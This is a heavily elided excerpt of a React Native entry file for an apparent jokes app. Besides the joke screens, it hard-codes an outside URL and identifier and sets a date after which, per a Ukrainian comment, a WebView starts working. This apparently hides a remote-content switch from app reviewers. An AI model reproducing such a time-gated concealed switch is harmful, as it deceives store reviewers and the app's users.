...
import ReadJokesScreen from './src/screens/ReadJokesScreen';
import SavedScreen from './src/screens/SavedScreen';
import WhoIsScreen from './src/screens/WhoIsScreen';
...
//export type CategoryKey = 'FOOTBALL' | 'HOCKEY' | 'TENNIS' | 'BASKETBALL' | 'KGB' | 'RUGBY';
...
//  Saved: undefined;
//  WhoIs: undefined;
//  JokesList: { category: CategoryKey };
//};
...
export default function App() {
  ...
  const INITIAL_URL = `https://fern-lake-ridge.space/`;
  const URL_IDENTIFAIRE = `Jhan5XyC`;
  ...
  OneSignal.initialize('21fa4060-200b-48b7-a836-159d2c63dfce');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-08-23T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    return (
      <Stack.Navigator initialRouteName="Onboarding" screenOptions={{ headerShown: false, animation: 'fade' }}>
        ...
        <Stack.Screen name="ReadJokes" component={ReadJokesScreen} />
        <Stack.Screen name="Saved" component={SavedScreen} />
        <Stack.Screen name="WhoIs" component={WhoIsScreen} />
